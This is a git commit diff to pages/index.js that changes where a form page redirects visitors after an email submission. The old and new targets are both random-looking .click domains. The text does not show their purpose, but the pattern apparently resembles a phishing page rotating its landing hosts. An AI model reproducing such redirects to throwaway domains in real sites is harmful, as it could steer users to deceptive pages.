56260a83f7f2e21820fdea517dc643b7a3d700e6
husknet <127146284+husknet@users.noreply.github.com>
2024-09-25 06:25:56 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sg.saga-sh.click';
+        window.location.href = 'https://sage.newtslozwexch.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
